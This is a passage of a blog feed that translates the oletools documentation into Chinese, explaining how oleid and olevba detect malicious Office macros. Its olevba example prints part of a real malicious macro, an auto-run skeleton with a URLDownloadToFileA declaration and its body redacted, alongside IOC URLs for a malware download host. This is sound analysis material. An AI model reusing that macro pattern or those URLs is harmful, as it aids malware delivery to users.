title="结语"></a>结语</h2><p>以上你都会了吗？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文为 ViperMonkey 的中文版，原文链接：&lt;a href=&quot;https://github.com/decalage2/ViperMonkey/&quot;&gt;https://github.com/decalage2/ViperMonkey/&lt;/a&gt;&lt;</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="Office" scheme="https://zeronohacker.github.io/tags/Office/"/>
    
    <category term="ViperMonkey" scheme="https://zeronohacker.github.io/tags/ViperMonkey/"/>
    
    <category term="VBA" scheme="https://zeronohacker.github.io/tags/VBA/"/>
    
  </entry>
  
  <entry>
    <title>恶意文档分析工具 oletools 使用说明</title>
    <link href="https://zeronohacker.github.io/2020/09/08/maldoc-analysis-tool-oletools-instructions/"/>
    <id>https://zeronohacker.github.io/2020/09/08/maldoc-analysis-tool-oletools-instructions/</id>
    <published>2020-09-08T11:42:08.000Z</published>
    <updated>2021-09-19T13:08:49.115Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文为 oletools 文档的中文版，原文链接：<a href="https://github.com/decalage2/oletools/wiki">https://github.com/decalage2/oletools/wiki</a></p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>oletools 是一个用来分析 Microsoft OLE2 文件的工具包，OLE2 文件是一种以结构化存储的复合二进制文件或者复合文档格式的文件，例如微软的 Office文档、Outlook 邮件信息，工具包中的工具主要被用于进行恶意软件分析、取证和调试，工具是基于 olefile 解析器的。</p><p>想要获取更多 oletools 信息，请参看 <a href="http://www.decalage.info/python/oletools">http://www.decalage.info/python/oletools</a></p><p>Microsoft OLE2 请参看 <a href="http://en.wikipedia.org/wiki/Compound_File_Binary_Format">http://en.wikipedia.org/wiki/Compound_File_Binary_Format</a></p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/decalage2/oletools"><img src="https://github-readme-stats.vercel.app/api/pin/?username=decalage2&repo=oletools&theme=algolia&show_owner=true"/></a><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><div class="timeline"><div class="timenode"><div class="meta"><p><p>2020-09-03 v0.56</p></p></div><div class="body"><ol><li>olevba/mraptor: 新增 trigger _OnConnecting 检测</li><li>olevba: 更新 plugin_biff 至 0.0.15 版本，完善对 Excel 4/XLM 宏解析</li><li>olevba: 完善对 MHT 的检测</li><li>olevba: 新增 <code>--no-xlm</code> 选项，可关闭对 Excel 4/XLM 宏解析</li><li>olevba: 修复在 VBA 解压原始 chunks 的 bug</li><li>oleform: 完善解析</li><li>oleobj: <code>Ole10Native</code> 现在不区分大小写</li><li>clsid: 新增 PDF 和 Microsoft Word Picture</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2019-12-16 v0.55.2</p></p></div><div class="body"><ol><li>rtfobj: 从目标控制字列表中删除 <code>\rtf</code></li><li>rtfobj: 修复 process_file 中对 Equation 类的检测</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2019-12-03 v0.55</p></p></div><div class="body"><ol><li>olevba: 支持 SLK 文件和从 SLK 文件中提取的 XLM 宏检测</li><li>olevba: 支持 VBA Stomping 检测</li><li>olevba: 将 pcodedmp 集成，使之能够对 P-code 提取和反汇编</li><li>olevba: 检测 P-code 中的可疑关键字</li><li>olevba: 新增 –pcode 选项，支持显示反汇编后的 P-code</li><li>对于不支持 UTF-8 语言环境的系统，可以更好地处理 unicode，例如 LANG=C</li><li>rtfobj: 新增 CVE-2017-0199</li></ol><p>v0.55 之前的版本更新记录请自行在源码中查看 ……</p></div></div></div><h2 id="工具包中各工具简单说明"><a href="#工具包中各工具简单说明" class="headerlink" title="工具包中各工具简单说明"></a>工具包中各工具简单说明</h2><p>用来分析恶意文档的工具</p><div class="table-container"><table><thead><tr><th>工具名</th><th>用途</th></tr></thead><tbody><tr><td>oleid</td><td>用于分析 OLE 文件以便检测是否具有恶意文件的基本特征</td></tr><tr><td>olevba</td><td>从 MS Office 文档 (OLE、OpenXML) 中提取和分析 VBA 宏代码</td></tr><tr><td>MacroRaptor</td><td>检测恶意 VBA 宏</td></tr><tr><td>msodde</td><td>从 MS Office 文档、RTF 和 CSV 中提取和检测 DDE/DDEAUTO 链接</td></tr><tr><td>pyxswf</td><td>从 MS Office 文档 (例如 WORD、Excel)、RTF 中检测、提取和分析嵌入的 Flash 对象 (SWF)</td></tr><tr><td>oleobj</td><td>从 OLE 文件中提取嵌入的对象</td></tr><tr><td>rtfobj</td><td>从 RTF 文件中提取嵌入的对象</td></tr></tbody></table></div><p>用于分析 OLE 文件结构的工具</p><div class="table-container"><table><thead><tr><th>工具名</th><th>用途</th></tr></thead><tbody><tr><td>olebrowse</td><td>一个简单的 GUI 程序，用来查看和提取 OLE 文件 (例如 MS WORD、Excel 和 PPT) 中单个数据流</td></tr><tr><td>olemeta</td><td>从 OLE 文件中提取所有的标准属性，标准属性也称元数据</td></tr><tr><td>oletimes</td><td>提取所有流和存储当中创建和修改的时间戳</td></tr><tr><td>oledir</td><td>显示 OLE 文件的所有目录条目</td></tr><tr><td>olemap</td><td>以 map 的形式显示 OLE 文件中的区域</td></tr></tbody></table></div><h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>如果你想获取最新的稳定版本，请按相应平台使用 <code>pip</code> 命令安装</p><div class="tabs" id="install-stand-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-stand-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-stand-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-stand-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U oletools</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-stand-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U oletools</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>如果你想获取最新的开发者安装版本，请按相应平台执行命令</p><div class="tabs" id="install-dev-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-dev-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-dev-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-dev-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U https://github.com/decalage2/oletools/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-dev-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U https://github.com/decalage2/oletools/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="oleid"><a href="#oleid" class="headerlink" title="oleid"></a>oleid</h2><p>oleid 是一个用来分析 OLE 文件 (例如 MS Office 文档中的 Word、Excel) 的脚本文件，可以检测恶意文件的一般特征，举个粟子，比如能够检测 VBA 宏和嵌入的 Flash 对象。</p><h3 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h3><p>oleid 的主要特性</p><ul><li>检测 OLE 文件类型</li><li>检测 VBA 宏</li><li>检测嵌入的 Flash 对象</li><li>检测嵌入的 OLE 对象</li><li>检测加密的 MS Office</li><li>能用作一个命令行工具</li><li>将 Python API 集成到应用程序中</li></ul><p>计划要完善的地方</p><ul><li>提取更多的 metadata 重要域</li><li>支持 OpenXML 文件和嵌入的 OLE 文件</li><li>通用 VBA 宏检测</li><li>检测自动执行的 VBA 宏</li><li>扩展 OLE 文件类型的检测</li><li>检测不同寻常的 OLE 结构</li><li>可对多个文件扫描</li><li>可对压缩文件内的文件扫描</li><li>CSV 格式输出</li></ul><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oleid &lt;file&gt;</span><br></pre></td></tr></table></figure><p>举个粟子，比如检测 VBA 宏和嵌入的 Flash 对象</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;oleid word_flash_vba.doc</span><br><span class="line">Filename: word_flash_vba.doc</span><br><span class="line">+-------------------------------+-----------------------+</span><br><span class="line">| Indicator                     | Value                 |</span><br><span class="line">+-------------------------------+-----------------------+</span><br><span class="line">| OLE format                    | True                  |</span><br><span class="line">| Has SummaryInformation stream | True                  |</span><br><span class="line">| Application name              | Microsoft Office Word |</span><br><span class="line">| Encrypted                     | False                 |</span><br><span class="line">| Word Document                 | True                  |</span><br><span class="line">| VBA Macros                    | True                  |</span><br><span class="line">| Excel Workbook                | False                 |</span><br><span class="line">| PowerPoint Presentation       | False                 |</span><br><span class="line">| Visio Drawing                 | False                 |</span><br><span class="line">| ObjectPool                    | True                  |</span><br><span class="line">| Flash objects                 | 1                     |</span><br><span class="line">+-------------------------------+-----------------------+</span><br></pre></td></tr></table></figure><h3 id="在-Python-程序中如何使用-oleid"><a href="#在-Python-程序中如何使用-oleid" class="headerlink" title="在 Python 程序中如何使用 oleid"></a>在 Python 程序中如何使用 oleid</h3><p>首先，需要导入 oletools.oleid 模块，然后创建一个 OleID 对象来扫描一个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> oletools.oleid</span><br><span class="line">oid = oletools.oleid.OleID(filename)</span><br></pre></td></tr></table></figure><div class="tip "><p>注意：filename 参数可以是一个文件名，也可以是一个类文件对象或者是要分析的文件里所包含的一个字节类字符串</p></div><p>完成上述操作后，接下来就是要去调用 check() 方法，这个方法会返回 Indicator 对象，每个 Indicator 对象都有如下这些属性</p><ul><li>id: Indicator 的标识符，字符串类型</li><li>name: Indicator 的名称，字符串类型</li><li>description: Indicator 的描述，字符串类型</li><li>type: Indicator 的类，比如 bool、str、int</li><li>value: Indicator 的值</li></ul><p>举个粟子，下面这段代码显示所有的 Indicator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">indicators = oid.check()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> indicators:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Indicator id=%s name=&quot;%s&quot; type=%s value=%s&#x27;</span> % (i.<span class="built_in">id</span>, i.name, i.<span class="built_in">type</span>, <span class="built_in">repr</span>(i.value))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;description:&#x27;</span>, i.description</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>想要获取更多详细细节，请自行参看 oleid.py 源码。</p><h2 id="olevba"><a href="#olevba" class="headerlink" title="olevba"></a>olevba</h2><p>olevba 是一个用来解析 OLE 和 OpenXML 文件的脚本文件，可以提取和检测 VBA 宏，也可用来检测与安全相关的指标，比如自动执行宏，VBA 可疑关键字，反沙箱和反虚拟化技术，IOCs (IP 地址、URLs、可执行文件名等等)。它还可以检测和解码运用了几种常见的混淆方法的字符串，包括 <strong>Hex、StrReverse、Base64、Dridex、VBA expressions</strong>，并可以从解码后的字符串提取 IOCs。XLM/Excel 4 宏在 Excel 和 SLK 文件中也受支持。</p><h3 id="支持的文件格式"><a href="#支持的文件格式" class="headerlink" title="支持的文件格式"></a>支持的文件格式</h3><ul><li>Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)</li><li>Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)</li><li>PowerPoint 97-2003 (.ppt), PowerPoint 2007+ (.pptm, .ppsm)</li><li>Word/PowerPoint 2007+ XML</li><li>Word 2003 XML (.xml)</li><li>Word/Excel Single File Web Page / MHTML (.mht)</li><li>Publisher (.pub)</li><li>SYLK/SLK 文件 (.slk)</li><li>包含 VBA 的文本文件或者 VBScript 源代码</li><li>对以上文件的有密码保护的压缩包</li></ul><h3 id="主要特性-1"><a href="#主要特性-1" class="headerlink" title="主要特性"></a>主要特性</h3><p>olevba 主要特性</p><ul><li>能对 MS Office 97-2003，2007+，XML 和 MHT 文件检测</li><li>提取 VBA 宏代码</li><li>检测自动执行宏</li><li>检测 VBA 宏中的可疑关键字</li><li>检测反沙箱和反虚拟化技术</li><li>能够检测和解码那些经过 <code>Hex/Base64/StrReverse/Dridex</code> 编码后的字符串</li><li>使用 pyparsing 内置的 VBA 解析器可对任意编码组合 (Chr、Asc、Val、StrReverse、Environ、+、&amp;、自定义的 Hex 和 Base64 加密) 的字符串做去混淆处理</li><li>提取 IOCs 或其它你感兴趣的一些特征，比如 IP 地址、URLs、E-Mail 和可执行文件名</li><li>扫描多个文件和样本集</li><li>分类模式能显示多个文件的摘要视图</li><li>能够对压缩后的带密码保护的包进行扫描</li><li>在你的应用程序中可使用 olevba 中的 Python API</li></ul><div class="tip "><p>提示：加密后的 MS Office 的文档也是支持的，因为 VBA 宏实际并没有加密，只是文档的内容加密。</p></div><h3 id="关于-VBA-宏"><a href="#关于-VBA-宏" class="headerlink" title="关于 VBA 宏"></a>关于 VBA 宏</h3><p>可参看 <a href="http://www.decalage.info/en/vba_tools">这篇文章</a> 来获取更多关于 VBA 宏的信息和技术以及它们是怎样在 MS Office 文档存储的。</p><h3 id="olevba-是如何工作的"><a href="#olevba-是如何工作的" class="headerlink" title="olevba 是如何工作的"></a>olevba 是如何工作的</h3><p>olevba 大体的运行流程如下</p><ul><li>检测文件的类型，看是否为 OLE 文件，如果为 OLE 文件则立马解析</li><li>如果它是一个压缩文件类型，则为 MS Office 2007+、XML 或 MHTML 文件，olevba 能够从中 (比如 vbaProject.bin、editdata.mso) 获取到所有的 ole 对象文件并打开</li><li>olevba 能够确定存储在 OLE 结构中的的有 VBA Projects</li><li>解析每个 VBA Project以便查找包含宏代码的相应 OLE 流</li><li>在每个 OLE 流中，VBA 宏代码会被提取和解压出来</li><li>olevba 会去查找经过诸如 <code>Hex/Base64/StrReverse/Dridex/VBA expressions</code> 算法编码后的字符串</li><li>olevba 扫描宏代码，去混淆，查找可疑的关键字、自动执行宏和 IOCs (URLs、IP 地址、E-Mail 地址、可执行文件名等等)</li></ul><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Usage: olevba [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password.</span><br><span class="line">  -p PASSWORD, --password=PASSWORD</span><br><span class="line">                        if encrypted office files are encountered, try</span><br><span class="line">                        decryption with this password. May be repeated.</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -a, --analysis        display only analysis results, not the macro source</span><br><span class="line">                        code</span><br><span class="line">  -c, --code            display only VBA source code, do not analyze it</span><br><span class="line">  --decode              display all the obfuscated strings with their decoded</span><br><span class="line">                        content (Hex, Base64, StrReverse, Dridex, VBA).</span><br><span class="line">  --attr                display the attribute lines at the beginning of VBA</span><br><span class="line">                        source code</span><br><span class="line">  --reveal              display the macro source code after replacing all the</span><br><span class="line">                        obfuscated strings by their decoded content.</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  --deobf               Attempt to deobfuscate VBA expressions (slow)</span><br><span class="line">  --relaxed             Do not raise errors if opening of substream fails</span><br><span class="line">  Output mode (mutually exclusive):</span><br><span class="line">    -t, --triage        triage mode, display results as a summary table</span><br><span class="line">                        (default for multiple files)</span><br><span class="line">    -d, --detailed      detailed mode, display full results (default for</span><br><span class="line">                        single file)</span><br><span class="line">    -j, --json          json mode, detailed in json format (never default)</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 v0.54 新版本中，-p 选项被用来解密那些加了密的文档</p></div><h3 id="一些粟子"><a href="#一些粟子" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc</span><br></pre></td></tr></table></figure><p>扫描一个加了密的的 zip 压缩文件，密码为 <code>infected</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba malicious_file.xls.zip -z infected</span><br></pre></td></tr></table></figure><p>扫描单个文件，显示所有混淆字符串被解码后的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc --decode</span><br></pre></td></tr></table></figure><p>扫描单个文件，显示 VBA 字符串去混淆后的宏代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc --reveal</span><br></pre></td></tr></table></figure><p>扫描提取后的宏代码文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba source_code.vba</span><br></pre></td></tr></table></figure><p>扫描一个文件夹下的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*&quot;</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 Linux、MacOSX 或其它类 Unix 系统上，在通配符旁必须添加双引号，否则会被当作 shell 命令</p></div><p>在所有子目录中递归扫描所有的 .doc 和 .xls 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*.doc&quot; &quot;MalwareZoo/VBA/*.xls&quot; -r</span><br></pre></td></tr></table></figure><p>在带有密码的压缩包内递归扫描所有的 .doc 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*.zip&quot; -r -z infected -f &quot;*.doc&quot;</span><br></pre></td></tr></table></figure><h3 id="详细分析模式-默认单个文件"><a href="#详细分析模式-默认单个文件" class="headerlink" title="详细分析模式 (默认单个文件)"></a>详细分析模式 (默认单个文件)</h3><p>当单个文件被扫描或使用 -d 选项时，分析的所有详细细节将会被罗列出来，比如下面扫描 DIAN_caso-5415.doc.zip 这个恶意文件时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">olevba c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip -z infected</span></span><br><span class="line">===============================================================================</span><br><span class="line">FILE: DIAN_caso-5415.doc.malware in c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip</span><br><span class="line">Type: OLE</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO ThisDocument.cls</span><br><span class="line">in file: DIAN_caso-5415.doc.malware - OLE stream: Macros/VBA/ThisDocument</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Option Explicit</span><br><span class="line">Private Declare Function URLDownloadToFileA Lib &quot;urlmon&quot; (ByVal FVQGKS As Long,_</span><br><span class="line">ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _</span><br><span class="line">ByVal HQTLDG As Long) As Long</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Auto_Open()</span><br><span class="line">SNVJYQ</span><br><span class="line">End Sub</span><br><span class="line">Public Sub SNVJYQ()</span><br><span class="line">    [Malicious Code...]</span><br><span class="line">End Sub</span><br><span class="line">Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean</span><br><span class="line">    [Malicious Code...]</span><br><span class="line">    Application.DisplayAlerts = False</span><br><span class="line">    Application.Quit</span><br><span class="line">End Function</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">ANALYSIS:</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br><span class="line">| Type       | Keyword              | Description                             |</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br><span class="line">| AutoExec   | AutoOpen             | Runs when the Word document is opened   |</span><br><span class="line">| AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |</span><br><span class="line">| AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |</span><br><span class="line">| Suspicious | Lib                  | May run code from a DLL                 |</span><br><span class="line">| Suspicious | Shell                | May run an executable file or a system  |</span><br><span class="line">|            |                      | command                                 |</span><br><span class="line">| Suspicious | Environ              | May read system environment variables   |</span><br><span class="line">| Suspicious | URLDownloadToFileA   | May download files from the Internet    |</span><br><span class="line">| IOC        | http://germanya.com. | URL                                     |</span><br><span class="line">|            | ec/logs/test.exe&quot;    |                                         |</span><br><span class="line">| IOC        | http://germanya.com. | URL                                     |</span><br><span class="line">|            | ec/logs/counter.php&quot; |                                         |</span><br><span class="line">| IOC        | germanya.com         | Executable file name                    |</span><br><span class="line">| IOC        | test.exe             | Executable file name                    |</span><br><span class="line">| IOC        | sfjozjero.exe        | Executable file name                    |</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="分流模式-默认多个文件"><a href="#分流模式-默认多个文件" class="headerlink" title="分流模式 (默认多个文件)"></a>分流模式 (默认多个文件)</h3><p>当多个文件被扫描或使用 -t 选项时，每个文件的概要信息会被罗列出来，<strong>这对于快速分类可疑文件集合更为方便</strong>。下面为分析结果中显示的标志说明</p><ul><li>OLE：文件类型为 OLE，比如 MS Office 97-2003</li><li>OpX：文件类型为 OpenXML，比如 MS Office 2007+</li><li>XML：文件类型为 Word 2003 XML</li><li>MHT：文件类型为 Word MHTML，即 .mht 文件</li><li>?：不支持的文件类型</li><li>M：包含 VBA 宏</li><li>A：自动执行宏</li><li>S：可疑的 VBA 关键字</li><li>I：IOCs</li><li>H：Hex 编码的字符串</li><li>B：Base64 编码的字符串</li><li>D：Dridex 编码的字符串</li><li>V：VBA expressions 字符串</li></ul><p>下面举个粟子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;olevba \MalwareZoo\VBA\samples\*</span><br><span class="line">Flags       Filename</span><br><span class="line">----------- -----------------------------------------------------------------</span><br><span class="line">OLE:MASI--- \MalwareZoo\VBA\samples\DIAN_caso-5415.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_1.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_2.doc.malware</span><br><span class="line">OLE:MASI--- \MalwareZoo\VBA\samples\DRIDEX_3.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_4.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_5.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_6.doc.malware</span><br><span class="line">OLE:MAS---- \MalwareZoo\VBA\samples\DRIDEX_7.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_8.doc.malware</span><br><span class="line">OLE:MASIHBD \MalwareZoo\VBA\samples\DRIDEX_9.xls.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_A.doc.malware</span><br><span class="line">OLE:------- \MalwareZoo\VBA\samples\Normal_Document.doc</span><br><span class="line">OLE:M------ \MalwareZoo\VBA\samples\Normal_Document_Macro.doc</span><br><span class="line">OpX:MASI--- \MalwareZoo\VBA\samples\RottenKitten.xlsb.malware</span><br><span class="line">OLE:MASI-B- \MalwareZoo\VBA\samples\ROVNIX.doc.malware</span><br><span class="line">OLE:MA----- \MalwareZoo\VBA\samples\Word within Word macro auto.doc</span><br></pre></td></tr></table></figure><h3 id="支持-Python3-——-olevba3"><a href="#支持-Python3-——-olevba3" class="headerlink" title="支持 Python3 —— olevba3"></a>支持 Python3 —— olevba3</h3><p>自从 v0.54 版本以来，olevba 完全兼容 Python2 和 Python3，因此 olevba3 就没必要再去使用了，但是为了向下兼容，还是将它保留了。</p><h3 id="在-Python-应用程序中如何使用-olevba"><a href="#在-Python-应用程序中如何使用-olevba" class="headerlink" title="在 Python 应用程序中如何使用 olevba"></a>在 Python 应用程序中如何使用 olevba</h3><p>olevba 可被用来打开一个 MS Office 文件，检测它是否包含 VBA 宏，并可以提取和分析宏代码。</p><div class="tip "><p>注意：olevba 目前正在积极开发中，因此有些 API 会发生更改</p></div><span class='p blue'>导入 olevba</span><p>首先，需导入 oletools.olevba 包，至少得用到 VBA_Parser 和 VBA_Scanner 类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> oletools.olevba <span class="keyword">import</span> VBA_Parser, TYPE_OLE, TYPE_OpenXML, TYPE_Word2003_XML, TYPE_MHTML</span><br></pre></td></tr></table></figure><span class='p blue'>用 VBA_Parser 解析 MS Office 文件</span><p>解析一个 MS Office 文件，需创建 VBA_Parser 类的实例，并提供要打开的文件所在路径作为参数，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbaparser = VBA_Parser(<span class="string">&#x27;my_file_with_macros.doc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此外，也能将此文件里的数据作为字节类型字符串参数，在这种情况下，文件名必须提供，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">myfile = <span 